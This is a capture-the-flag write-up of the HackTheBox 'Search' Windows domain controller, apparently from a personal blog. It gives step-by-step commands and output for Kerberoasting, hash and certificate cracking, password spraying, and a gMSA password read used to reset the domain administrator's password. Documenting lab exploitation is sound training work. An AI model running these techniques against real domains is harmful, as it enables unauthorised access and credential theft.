---
title: "HackTheBox Search Write-Up"
date: 2022-04-30
slug: hackthebox-search-write-up
excerpt: "The Search machine on HackTheBox has just retired! This is my write-up for Search on HackTheBox. Here I detail the penetration testing steps taken to scan,…"
source: https://blog.nicpwns.com/hackthebox-search-write-up-245e93750cfe
tags: ["hackthebox"]
---

<p>The Search machine on HackTheBox has just retired! This is my write-up for Search on HackTheBox. Here I detail the penetration testing steps taken to scan, exploit, and privilege escalate on this target machine. This machine is Windows, categorized as hard, and was retired on April 30, 2022.</p>
<h2>Search Summary</h2>
<figure><img src="/writeups/hackthebox-search-write-up/img-1.png" alt="Search Avatar"  decoding="async" width="300" height="300" loading="eager" fetchpriority="high" /></figure>
<h2>Target Information</h2>
<p><a href="https://app.hackthebox.com/machines/Search"><strong>Machine Page</strong></a><br><strong>IP Address:</strong> 10.10.11.129<br><strong>Hostname:</strong> search.htb</p>
<h2>Synopsis</h2>
<p>A website on a domain controller exposes multiple usernames and a password. Kerberoasting works for a username and password combination to crack another service password in plaintext. This service password can be used to access another user’s account and download an Excel file with more usernames and passwords. One of these new username and password combinations gives access to a new user containing the user flag and some certificate files. The certificate files can be cracked and used to access a PowerShell Web Console on the web server. Using the PowerShell console, a GMSA password read attack can be used to change the domain administrator’s password and fully escalate to the domain admin.</p>
<h2>Scanning</h2>
<h3>Nmap</h3>
<p>The Nmap scan shows that there is an HTTP server on port <code>80/tcp</code> and <code>443/tcp</code> . All of the ports/services typically associated with a domain controller like port <code>464/tcp</code> and <code>636/tcp</code> are also present, suggesting this server is a domain controller.</p>
<pre><code># nmap -sV -sC -p- 10.10.11.129
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-29 18:26 EDT
Nmap scan report for 10.10.11.129
Host is up (0.066s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Search &amp;mdash; Just Testing IIS
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-04-29 22:30:32Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
|_ssl-date: 2022-04-29T22:32:03+00:00; -17s from scanner time.
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
| tls-alpn: 
|_  http/1.1
|_http-server-header: Microsoft-IIS/10.0
|_ssl-date: 2022-04-29T22:32:03+00:00; -17s from scanner time.
|_http-title: Search &amp;mdash; Just Testing IIS
| http-methods: 
|_  Potentially risky methods: TRACE
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2022-04-29T22:32:03+00:00; -17s from scanner time.
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
8172/tcp  open  ssl/http      Microsoft IIS httpd 10.0
| ssl-cert: Subject: commonName=WMSvc-SHA2-RESEARCH
| Not valid before: 2020-04-07T09:05:25
|_Not valid after:  2030-04-05T09:05:25
|_http-server-header: Microsoft-IIS/10.0
|_ssl-date: 2022-04-29T22:32:03+00:00; -17s from scanner time.
|_http-title: Site doesn't have a title.
| tls-alpn: 
|_  http/1.1
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  msrpc         Microsoft Windows RPC
49702/tcp open  msrpc         Microsoft Windows RPC
49727/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: RESEARCH; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
|_clock-skew: mean: -17s, deviation: 0s, median: -17s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-04-29T22:31:24
|_  start_date: N/A
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 334.05 seconds</code></pre>
<h3>Gobuster</h3>
<p>A gobuster directory fuzzing scan shows an interesting <code>/staff</code> directory for us to check out.</p>
<pre><code># gobuster dir -u http://search.htb/ -w /usr/share/wordlists/dirpwn.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://search.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirpwn.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/04/29 19:26:49 Starting gobuster in directory enumeration mode
===============================================================
/certenroll           (Status: 301) [Size: 152] [--&gt; http://search.htb/certenroll/]
/certenroll           (Status: 301) [Size: 152] [--&gt; http://search.htb/certenroll/]
/certsrv              (Status: 401) [Size: 1293]                                                                         
/clinton%20sparks%20%26%20diddy%20-%20dont%20call%20it%20a%20comeback%28ruzty%29 (Status: 400) [Size: 3420]
/css                  (Status: 301) [Size: 145] [--&gt; http://search.htb/css/]                               
/css                  (Status: 301) [Size: 145] [--&gt; http://search.htb/css/]                                                                                        
/fonts                (Status: 301) [Size: 147] [--&gt; http://search.htb/fonts/]                                                                                                                                            
/images               (Status: 301) [Size: 148] [--&gt; http://search.htb/images/]                            
/Images               (Status: 301) [Size: 148] [--&gt; http://search.htb/Images/]                            
/images               (Status: 301) [Size: 148] [--&gt; http://search.htb/images/]                            
/Images               (Status: 301) [Size: 148] [--&gt; http://search.htb/Images/]                            
/index.html           (Status: 200) [Size: 44982]                                                          
/js                   (Status: 301) [Size: 144] [--&gt; http://search.htb/js/]                                                                                         
/staff                (Status: 403) [Size: 1233]</code></pre>
<h3>Staff Page</h3>
<p>We receive a <code>403 Forbidden</code> status code from the <code>/staff</code> directory. We'll have to come back to this later with some kind of credentials.</p>
<figure><img src="/writeups/hackthebox-search-write-up/img-2.png" alt="Access denied to /staff."  decoding="async" width="754" height="241" loading="lazy" /><figcaption>Access denied to /staff.</figcaption></figure>
<h3>Main Site</h3>
<p>The main site is a basic IIS web server with some small bits of customization that we should look at.</p>
<figure><img src="/writeups/hackthebox-search-write-up/img-3.png" alt="Main site landing page."  decoding="async" width="1170" height="245" loading="lazy" /><figcaption>Main site landing page.</figcaption></figure>
<p>One interesting piece of information is a potential username and password contained in a note in a photo.</p>
<figure><img src="/writeups/hackthebox-search-write-up/img-4.png" alt="Features section with notes image."  decoding="async" width="768" height="496" loading="lazy" /><figcaption>Features section with notes image.</figcaption></figure>
<p>When zooming in we can see a potential domain username of <code>Hope.Sharp</code> and a password of <code>IsolationIsKey?</code>.</p>
<figure><img src="/writeups/hackthebox-search-write-up/img-5.png" alt="Notes image zoomed to reveal username and password."  decoding="async" width="456" height="248" loading="lazy" /><figcaption>Notes image zoomed to reveal username and password.</figcaption></figure>
<p>Some additional potential usernames can be found from the “Our Team” section of the website.</p>
<figure><img src="/writeups/hackthebox-search-write-up/img-6.png" alt="Our Team section revealing multiple possible user names."  decoding="async" width="768" height="565" loading="lazy" /><figcaption>Our Team section revealing multiple possible user names.</figcaption></figure>
<h2>Initial Access</h2>
<p>Using the first username and password we found for Hope Sharp, we can attempt to list SMB shares.</p>
<pre><code># smbclient -L //search.htb/ -U Hope.Sharp                                                                                                            
Enter WORKGROUP\Hope.Sharp's password: 
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        CertEnroll      Disk      Active Directory Certificate Services share
        helpdesk        Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        RedirectedFolders$ Disk      
        SYSVOL          Disk      Logon server share</code></pre>
<p>Looking in the <code>RedirectedFolders$</code> share. We find even more usernames!</p>
<pre><code># smbclient //search.htb/RedirectedFolders$ -U Hope.Sharp                                                                                             
Enter WORKGROUP\Hope.Sharp's password: 
Try "help" to get a list of possible commands.
smb: \&gt; ls
  .                                  Dc        0  Tue Aug 11 07:39:13 2020
  ..                                 Dc        0  Tue Aug 11 07:39:13 2020
  abril.suarez                       Dc        0  Tue Apr  7 14:12:58 2020
  Angie.Duffy                        Dc        0  Fri Jul 31 09:11:32 2020
  Antony.Russo                       Dc        0  Fri Jul 31 08:35:32 2020
  belen.compton                      Dc        0  Tue Apr  7 14:32:31 2020
  Cameron.Melendez                   Dc        0  Fri Jul 31 08:37:36 2020
  chanel.bell                        Dc        0  Tue Apr  7 14:15:09 2020
  Claudia.Pugh                       Dc        0  Fri Jul 31 09:09:08 2020
  Cortez.Hickman                     Dc        0  Fri Jul 31 08:02:04 2020
  dax.santiago                       Dc        0  Tue Apr  7 14:20:08 2020
  Eddie.Stevens                      Dc        0  Fri Jul 31 07:55:34 2020
  edgar.jacobs                       Dc        0  Thu Apr  9 16:04:11 2020
  Edith.Walls                        Dc        0  Fri Jul 31 08:39:50 2020
  eve.galvan                         Dc        0  Tue Apr  7 14:23:13 2020
  frederick.cuevas                   Dc        0  Tue Apr  7 14:29:22 2020
  hope.sharp                         Dc        0  Thu Apr  9 10:34:41 2020
  jayla.roberts                      Dc        0  Tue Apr  7 14:07:00 2020
  Jordan.Gregory                     Dc        0  Fri Jul 31 09:01:06 2020
  payton.harmon                      Dc        0  Thu Apr  9 16:11:39 2020
  Reginald.Morton                    Dc        0  Fri Jul 31 07:44:32 2020
  santino.benjamin                   Dc        0  Tue Apr  7 14:10:25 2020
  Savanah.Velazquez                  Dc        0  Fri Jul 31 08:21:42 2020
  sierra.frye                        Dc        0  Wed Nov 17 20:01:46 2021
  trace.ryan                         Dc        0  Thu Apr  9 16:14:26 2020</code></pre>
<p>Now that we know Hope Sharp’s password works, it’s worth giving <a href="https://attack.mitre.org/techniques/T1558/003/">kerberoasting</a> a try with <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py">Impacket</a>.</p>
<pre><code># impacket-GetUserSPNs -request -dc-ip 10.10.11.129 search.htb/Hope.Sharp:IsolationIsKey? 
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
ServicePrincipalName               Name     MemberOf  PasswordLastSet             LastLogon  Delegation 
---------------------------------  -------  --------  --------------------------  ---------  ----------
RESEARCH/web_svc.search.htb:60001  web_svc            2020-04-09 08:59:11.329031  &lt;never&gt;               
$krb5tgs$23$*web_svc$SEARCH.HTB$search.htb/web_svc*$a37ba59ac4a33a73ff132c9604b05b3f$b6a18d2138a59054260bbe599d192b915b32869fb037720350cf162cbb0a02a1b304cf30a9eb92c0df751dc7efba9b80c563f49a72afcc972c3f3fa1dee275a600bad29a65144d53e24a01dffeae20a1c10edbce89885488e3cad2a22b0d44a231e35a88447111ec09f7d1ee48c7781272d8eabc6187f3739c3cdf9d80415c442593292778f364b74cfd35bcdbb782e8bc3819179a19158d8666fa1b882356f00c77d79e47623c1fb05d7b2df7c01e97ecc0eba584e00078beeeac430437274d543cd6b031b24c2d78844843af32bd1b74deb6222692aa98655483b6724dd76f5731cd6d6a9e75dc8632c427f71044d0ac9124eaf3d59c138064109854349dd9a43800d7b510d1b47da1118fd5c06677625de131081965477ecc4d9aaa8611b6da7ec226613fd40aa405450a11e8bf09b5646171aa34ff1543ab496a11ca8d07c13f4710b7ae3720b01151f01be3561f75c33f3341247f9805797e3eef9eae1e3119303269221a150ce5e9f6281e9a410dca202ba5c0a4cb43d7a757d17dfe1278ca9624999d0548a4ff7f969f9cb9bf350b3cef8475e1ec90246944acc6b0fd555a4216145f4af29083018385c3ffd09942fcf7c9037c54af092d4049553d6c9b480521e0c811f7e8773e3740be990624db828e902bab49c2c7d56cce30c0eb5763d7ce8fdfa82724c188d11d9d1343cb54ee795924857c0e60716cc48006ad5a299cbbd3da1ea1b348cddc175159095b21395180e205bafa2665d5c069a99449f2b4c43a7d52b302b30319ee2dc595e58ab7e341dec1cc984001311573f71308336c6d5d6c2ecdf3cc6b2b2b0a1d64463813c6eba7afc5f57e66487cae38bf8df41cbb17b79f86b9f59f29712a60d224ce94730e8c9a6a3948a785c84d38c423f9bc39e9e4886b65067af08d8653888a1bb54ca24a193caeba56d44b04ae19de4359d7a29b205a49abd33ee2072c4c43fef26c513be7443f9d195ecb6433b857ee74cb37e2dce7124bf5ce7c688e3f579d4b5bbc7a4a05a5dac267993fd784228dc11139612db085fb32d974322de9d4db42fbe66b5b6fd7134fba5324d4c33a4465d61a93a3953593ac5dc61b7bbf7399a9229f5131a4c7f20b68eac6c83e6e21b4900fb7015f2a0c0cdd5e312432be1d1aa88693fea6d8e2ee71f98fd1159ce79aaae1d95bdff3a4fb5366a274ee51a69b20014e76dc5089fdf5027d77efd976629e3309ed87565e2da55cca9f239a38dac8ecfdb535a870183db0fce978e5318628ea63fc80c76fbe1c1b63554e41384269477727551c028dbe07e041705c3a6e1a92037bdca439ca377c560c4a88e8ff0928122c2148c8a0fd94c989a777dcc5eb53482c3d2d0526a0271420bc7256d3ad0584d2bc26942bfbb6f7f33657671d7fe0717e3404b7e6b8e3050845f7653c8971ed59d6021177b9ebea2e83d45976bd87f34fbbdbc931a710c4a21f59f442d7c3</code></pre>
<p>We get a hash! Looks like we’ve found our path to exploitation.</p>
<h2>Exploit</h2>
<h3>Kerberos Cracking</h3>
<p>Using <a href="https://github.com/hashcat/hashcat">Hashcat</a>, we can attempt to crack the hash we previously found.</p>
<pre><code>.\hashcat.exe -m 13100 .\krb.txt ..\wordlists\rockyou.txt</code></pre>
<figure><img src="/writeups/hackthebox-search-write-up/img-7.png" alt="Hashcat cracking hash successfully."  decoding="async" width="768" height="381" loading="lazy" /><figcaption>Hashcat cracking hash successfully.</figcaption></figure>
<p>We were able to successfully crack the hash to find the plaintext password of <code>@3ONEmillionbaby</code>!</p>
<p>Although we have this password for a service account, we have to see if this password is used for any users that can login. Using <a href="https://github.com/byt3bl33d3r/CrackMapExec">CrackMapExec</a>, we can provide a list of users that we’ve collected and the password we cracked to identify a valid combination of credentials.</p>
<pre><code># crackmapexec smb search.htb -u users.txt -p '@3ONEmillionbaby' --continue-on-success                                                                
SMB         search.htb      445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True)
SMB         search.htb      445    RESEARCH         [-] search.htb\abril.suarez:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         search.htb      445    RESEARCH         [-] search.htb\Angie.Duffy:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         search.htb      445    RESEARCH         [-] search.htb\Antony.Russo:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         search.htb      445    RESEARCH         [-] search.htb\belen.compton:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         search.htb      445    RESEARCH         [-] search.htb\Cameron.Melendez:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         search.htb      445    RESEARCH         [-] search.htb\chanel.bell:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         search.htb      445    RESEARCH         [-] search.htb\Claudia.Pugh:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         search.htb      445    RESEARCH         [-] search.htb\Cortez.Hickman:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         search.htb      445    RESEARCH         [-] search.htb\dax.santiago:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         search.htb      445    RESEARCH         [-] search.htb\Eddie.Stevens:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         search.htb      445    RESEARCH         [+] search.htb\edgar.jacobs:@3ONEmillionbaby</code></pre>
<p>Edgar Jacobs is a hit! Let’s try to login to SMB with this username and the password we have.</p>
<pre><code># smbclient //search.htb/RedirectedFolders$ -U edgar.jacobs
Enter WORKGROUP\edgar.jacobs's password: 
Try "help" to get a list of possible commands.
smb: \&gt; cd edgar.jacobs\Desktop\
smb: \edgar.jacobs\Desktop\&gt; ls
  .                                 DRc        0  Mon Aug 10 06:02:16 2020
  ..                                DRc        0  Mon Aug 10 06:02:16 2020
  $RECYCLE.BIN                     DHSc        0  Thu Apr  9 16:05:29 2020
  desktop.ini                      AHSc      282  Mon Aug 10 06:02:16 2020
  Microsoft Edge.lnk                 Ac     1450  Thu Apr  9 16:05:03 2020
  Phishing_Attempt.xlsx              Ac    23130  Mon Aug 10 06:35:44 2020</code></pre>
<p>The login works and we can see a <code>Phishing_Attempt.xlsx</code> file on his Desktop. We'll download this and unzip it. Modern Microsoft Office files ending in 'x' are made up of XML files. We can view these XML files by unzipping the file to view all of the data.</p>
<pre><code># unzip Phishing_Attempt.xlsx      
Archive:  Phishing_Attempt.xlsx
  inflating: [Content_Types].xml     
  inflating: _rels/.rels             
  inflating: xl/workbook.xml         
  inflating: xl/_rels/workbook.xml.rels  
  inflating: xl/worksheets/sheet1.xml  
  inflating: xl/worksheets/sheet2.xml  
  inflating: xl/theme/theme1.xml     
  inflating: xl/styles.xml           
  inflating: xl/sharedStrings.xml    
  inflating: xl/drawings/drawing1.xml  
  inflating: xl/charts/chart1.xml    
  inflating: xl/charts/style1.xml    
  inflating: xl/charts/colors1.xml   
  inflating: xl/worksheets/_rels/sheet1.xml.rels  
  inflating: xl/worksheets/_rels/sheet2.xml.rels  
  inflating: xl/drawings/_rels/drawing1.xml.rels  
  inflating: xl/charts/_rels/chart1.xml.rels  
  inflating: xl/printerSettings/printerSettings1.bin  
  inflating: xl/printerSettings/printerSettings2.bin  
  inflating: xl/calcChain.xml        
  inflating: docProps/core.xml       
  inflating: docProps/app.xml</code></pre>
<p>After digging through the XML files, one part of this <code>Phishing_Attempt.xlsx</code> file contains many usernames and passwords. Again, we have even more usernames and passwords to try out on the domain. Using <a href="https://github.com/byt3bl33d3r/CrackMapExec">CrackMapExec</a> again we can check them all after adding them into TXT files. For the sake of space, I'm showing only the correct combination here which is the user <code>Sierra.Frye</code> and password <code>$$49=wide=STRAIGHT=jordan=28$$18</code>.</p>
<pre><code>crackmapexec smb search.htb -u sierra.frye  -p '$$49=wide=STRAIGHT=jordan=28$$18' --continue-on-success
SMB         search.htb      445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         search.htb      445    RESEARCH         [+] search.htb\sierra.frye:$$49=wide=STRAIGHT=jordan=28$$18</code></pre>
<p>Using this username and password combination, we can successfully login to SMB and grab the <code>user.txt</code> flag!</p>
<pre><code># smbclient //search.htb/RedirectedFolders$ -U sierra.frye                                                                                            
Enter WORKGROUP\sierra.frye's password: 
Try "help" to get a list of possible commands.
smb: \&gt; ls sierra.frye\Desktop\
  .                                 DRc        0  Wed Nov 17 20:08:00 2021
  ..                                DRc        0  Wed Nov 17 20:08:00 2021
  $RECYCLE.BIN                     DHSc        0  Tue Apr  7 14:03:59 2020
  desktop.ini                      AHSc      282  Fri Jul 31 10:42:15 2020
  Microsoft Edge.lnk                 Ac     1450  Tue Apr  7 08:28:05 2020
  user.txt                           Ac       33  Wed Nov 17 19:55:27 2021</code></pre>
<h2>Enumeration</h2>
<p>In Sierra Frye’s <code>Downloads</code> directory there are two interesting files we can download.</p>
<pre><code>smb: \&gt; cd sierra.frye\Downloads\Backups\
smb: \sierra.frye\Downloads\Backups\&gt; ls
  .                                 DHc        0  Mon Aug 10 16:39:17 2020
  ..                                DHc        0  Mon Aug 10 16:39:17 2020
  search-RESEARCH-CA.p12             Ac     2643  Fri Jul 31 11:04:11 2020
  staff.pfx                          Ac     4326  Mon Aug 10 16:39:17 2020
                3246079 blocks of size 4096. 467631 blocks available
smb: \sierra.frye\Downloads\Backups\&gt; get search-RESEARCH-CA.p12 
getting file \sierra.frye\Downloads\Backups\search-RESEARCH-CA.p12 of size 2643 as search-RESEARCH-CA.p12 (11.9 KiloBytes/sec) (average 11.9 KiloBytes/sec)
smb: \sierra.frye\Downloads\Backups\&gt; get staff.pfx 
getting file \sierra.frye\Downloads\Backups\staff.pfx of size 4326 as staff.pfx (19.6 KiloBytes/sec) (average 15.8 KiloBytes/sec)</code></pre>
<p>When researching the P12 and PFX files they are related to PKI certificates for authentication. This is likely what we need to access the <code>/staff</code> directory on the web server, but we need the password to these files in order to import them into our browser for use. There is a tool called <a href="https://github.com/Ridter/p12tool">P12Tool</a> that can be used to crack the password. It takes quite a while to process <code>rockyou.txt</code>.</p>
<pre><code># go run cmd/main.go crack -c ../staff.pfx -f /usr/share/wordlists/rockyou.txt
██████╗  ██╗██████╗ ████████╗ ██████╗  ██████╗ ██╗     
██╔══██╗███║╚════██╗╚══██╔══╝██╔═══██╗██╔═══██╗██║     
██████╔╝╚██║ █████╔╝   ██║   ██║   ██║██║   ██║██║     
██╔═══╝  ██║██╔═══╝    ██║   ██║   ██║██║   ██║██║     
██║      ██║███████╗   ██║   ╚██████╔╝╚██████╔╝███████╗
╚═╝      ╚═╝╚══════╝   ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
Version: 1.0 (n/a) - 04/29/22 - Evi1cg
2022/04/29 19:23:57 -&gt;  [*] Brute forcing...
2022/04/29 19:23:57 -&gt;  [*] Start thread num 100
2022/04/29 19:47:47 -&gt;  [+] Password found ==&gt; misspissy
2022/04/29 19:47:47 -&gt;  [*] Successfully cracked password after 5484392 attempts!</code></pre>
<p>The tool was able to successfully crack the password for the plaintext password of <code>misspissy</code>. We can verify the password works by simply trying to open the P12 file on our system.</p>
<figure><img src="/writeups/hackthebox-search-write-up/img-8.png" alt="Successful opening of P12 file using password."  decoding="async" width="521" height="503" loading="lazy" /><figcaption>Successful opening of P12 file using password.</figcaption></figure>
<p>Now we need to import both files into Firefox to use them to authenticate to the website. Visiting <a href="preferences#privacy">about:preferences#privacy</a> in Firefox leads us to the Certificate Manager. Both the P12 and PFX files should be imported using the discovered password.</p>
<figure><img src="/writeups/hackthebox-search-write-up/img-9.png" alt="Importing P12 and PFX file into Firefox Certificate Manager."  decoding="async" width="689" height="484" loading="lazy" /><figcaption>Importing P12 and PFX file into Firefox Certificate Manager.</figcaption></figure>
<p>Now when we visit the <code>/staff</code> directory we can authenticate!</p>
<figure><img src="/writeups/hackthebox-search-write-up/img-10.png" alt="Successful authentication to /staff website directory."  decoding="async" width="596" height="497" loading="lazy" /><figcaption>Successful authentication to /staff website directory.</figcaption></figure>
<p>The site ends up showing PowerShell Web Access. Perfect for easy code execution, and we already have valid credentials for login.</p>
<figure><img src="/writeups/hackthebox-search-write-up/img-11.png" alt="Logging into PowerShell Web Access."  decoding="async" width="871" height="523" loading="lazy" /><figcaption>Logging into PowerShell Web Access.</figcaption></figure>
<p>After logging in we can interact with a PowerShell session as Sierra Frye.</p>
<figure><img src="/writeups/hackthebox-search-write-up/img-12.png" alt="Successful command execution in PowerShell Web Access."  decoding="async" width="886" height="167" loading="lazy" /><figcaption>Successful command execution in PowerShell Web Access.</figcaption></figure>
<p>One of the first things to check is the groups Sierra Frye is in. An interesting group is the <code>ITSec</code> group in multiple locations.</p>
<pre><code>PS C:\Temp&gt; net group
Group Accounts for \\
-------------------------------------------------------------------------------
*Birmingham-HelpDesk
*Birmingham-ITSec
*Cloneable Domain Controllers
*DnsUpdateProxy
*Domain Admins
*Domain Computers
*Domain Controllers
*Domain Guests
*Domain Users
*Enterprise Admins
*Enterprise Key Admins
*Enterprise Read-only Domain Controllers
*Glasgow-HelpDesk
*Glasgow-ITSec
*Group Policy Creator Owners
*HelpDesk
*ITSec
*Key Admins
*London-HelpDesk
*London-ITSec
*Manchester-HelpDesk
*Manchester-ITSec
*Protected Users
*Read-only Domain Controllers
*Schema Admins
*Sheffield-HelpDesk
*Sheffield-ITSec</code></pre>
<p>Another area to check is the <code>Users</code> folder present on the current system. One very interesting user is <code>BIR-ADFS-GMSA$</code> which gives a clue that we can research.</p>
<pre><code>PS C:\Users\Sierra.Frye\Documents&gt; dir C:\Users
    Directory: C:\Users
Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        3/23/2020   7:20 AM                .NET v4.5                                                             
d-----        3/23/2020   7:20 AM                .NET v4.5 Classic                                                     
d-----       12/20/2021   8:34 AM                Administrator                                                         
d-----        7/31/2020  10:01 AM                BIR-ADFS-GMSA$                                                        
d-r---        3/23/2020   7:07 AM                Public                                                                
d-----        7/31/2020  11:04 AM                Sierra.Frye                                                           
d-----        8/11/2020   8:45 AM                WSEnrollmentServer</code></pre>
<p>An important step here is using tools like SharpHound and BloodHound to collect information and potential attack vectors about the domain. You can use a <a href="https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound.html">guide like this one</a> to perform this. BloodHound will tell us that GMSA is a likely vector to domain administrator who is <code>Tristan.Davies</code>.</p>
<p>When Googling for <code>BIR-ADFS-GMSA$</code> and GMSA we can find an Active Directory attack vector for <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#reading-gmsa-password">reading GMSA passwords</a>. We can follow the directions provided on this page.</p>
<p>First we need the <a href="https://github.com/micahvandeusen/gMSADumper">gMSADumper Python script</a>. When we run it, we can see we have access to grab the password hash as Sierra Frye!</p>
<pre><code># python3 gMSADumper.py -d search.htb -u 'Sierra.Frye' -p '$$49=wide=STRAIGHT=jordan=28$$18'                                                        
Users or groups who can read password for BIR-ADFS-GMSA$:
 &gt; ITSec
BIR-ADFS-GMSA$:::e1e9fd9e46d0d747e1595167eedcec0f</code></pre>
<p>This means we can use the next set of directions directly in PowerShell Web Access to run a command such as changing the domain administrator’s password to a password we know. Let’s do it!</p>
<pre><code>PS C:\Users\Sierra.Frye\Documents&gt; $user = 'BIR-ADFS-GMSA$'
PS C:\Users\Sierra.Frye\Documents&gt; $gmsa = Get-ADServiceAccount -Identity $user -Properties 'msDS-ManagedPassword'
PS C:\Users\Sierra.Frye\Documents&gt; $blob = $gmsa.'msDS-ManagedPassword'
PS C:\Users\Sierra.Frye\Documents&gt; $mp = ConvertFrom-ADManagedPasswordBlob $blob
PS C:\Users\Sierra.Frye\Documents&gt; $cred = New-Object System.Management.Automation.PSCredential $user,$mp.SecureCurrentPassword
PS C:\Users\Sierra.Frye\Documents&gt; Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock {net user Tristan.Davies NewPassword! /domain}
The command completed successfully.</code></pre>
<p>We have successfully reset the domain administrator Tristan Davies’ password to our own password <code>NewPassword!</code>.</p>
<h2>Root</h2>
<p>With the domain administrator’s password changed, let’s log into SMB and grab root.txt!</p>
<pre><code># smbclient //search.htb/C$ -U Tristan.Davies                                                                                                       
Enter WORKGROUP\Tristan.Davies's password: 
Try "help" to get a list of possible commands.
smb: \&gt; cd Users\Administrator\Desktop\
smb: \Users\Administrator\Desktop\&gt; ls
  .                                 DRc        0  Mon Nov 22 15:21:49 2021
  ..                                DRc        0  Mon Nov 22 15:21:49 2021
  desktop.ini                       AHS      282  Mon Nov 22 15:21:49 2021
  root.txt                          ARc       34  Fri Apr 29 17:54:21 2022
                3246079 blocks of size 4096. 536323 blocks available
smb: \Users\Administrator\Desktop\&gt; get root.txt
getting file \Users\Administrator\Desktop\root.txt of size 34 as root.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)</code></pre>
<h2>Loot</h2>
<p>Other than the points on HackTheBox, the lessons learned are the real treasures for this box.</p>
<ol><li>BloodHound is an extremely powerful tool. It gives us the most likely attack vector and the shortest path to domain administrator. In this case I didn’t go into depth with documenting BloodHound, but I plan to in a future post. For now, check out <a href="https://www.pentestpartners.com/security-blog/bloodhound-walkthrough-a-tool-for-many-tradecrafts/">this guide</a>.</li><li>Never underestimate the exposure of just a username. With just the usernames available on the website and other easy to access locations we were able to make a lot of progress on this box.</li></ol>
<p>Thank you for reading my write-up for the Search machine on HackTheBox. Be sure to check out my other write-ups for <a href="/notes?tag=hackthebox">HackTheBox</a>!</p>
